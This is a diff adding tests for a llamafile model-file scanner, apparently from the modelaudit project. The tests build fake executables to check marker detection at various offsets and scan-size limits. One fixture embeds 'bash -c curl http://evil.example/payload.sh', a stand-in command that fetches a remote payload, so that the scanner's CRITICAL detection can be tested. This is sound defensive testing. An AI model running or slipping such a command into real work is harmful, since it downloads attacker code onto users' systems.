@@ -8,7 +8,12 @@ import pytest
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners.base import IssueSeverity
-from modelaudit.scanners.llamafile_scanner import LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON, LlamafileScanner
+from modelaudit.scanners.llamafile_scanner import (
+    LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
+    LLAMAFILE_ROUTE_SCAN_BYTES,
+    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    LlamafileScanner,
+)
 
 
 def _build_llamafile_blob(
@@ -38,6 +43,73 @@ def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Pat
     generic_exe.write_bytes(b"MZ" + b"\x00" * 512 + b"normal executable")
 
     assert not LlamafileScanner.can_handle(str(generic_exe))
+
+
+def test_llamafile_scanner_can_handle_middle_only_marker_in_exe(tmp_path: Path) -> None:
+    binary = tmp_path / "middle-marker.exe"
+    binary.write_bytes(
+        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    assert LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_can_handle_casefolded_middle_marker_in_exe(tmp_path: Path) -> None:
+    binary = tmp_path / "middle-marker-uppercase.exe"
+    binary.write_bytes(
+        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"LLAMAFILE runtime" + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    assert LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_can_handle_malicious_middle_marker_in_exe(tmp_path: Path) -> None:
+    binary = tmp_path / "middle-marker-malicious.exe"
+    payload = _build_llamafile_blob(
+        runtime_lines=["bash -c curl http://evil.example/payload.sh"],
+        include_marker=False,
+    )
+    binary.write_bytes(
+        b"MZ"
+        + b"\x00" * 62
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        + payload
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert LlamafileScanner.can_handle(str(binary))
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
+    binary = tmp_path / "middle-near-match.exe"
+    binary.write_bytes(
+        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llama-file runtime" + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    assert not LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_can_handle_does_not_scan_past_route_budget(tmp_path: Path) -> None:
+    binary = tmp_path / "late-marker.exe"
+    binary.write_bytes(
+        b"MZ"
+        + b"\x00" * 62
+        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
+        + b"llamafile runtime"
+        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
+    )
+
+    assert not LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_can_handle_tail_only_marker_in_exe(tmp_path: Path) -> None:
+    binary = tmp_path / "tail-marker.exe"
+    binary.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * (LLAMAFILE_ROUTE_SCAN_BYTES + 64) + b"llamafile runtime")
+
+    assert LlamafileScanner.can_handle(str(binary))
 
 
 def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) -> None:
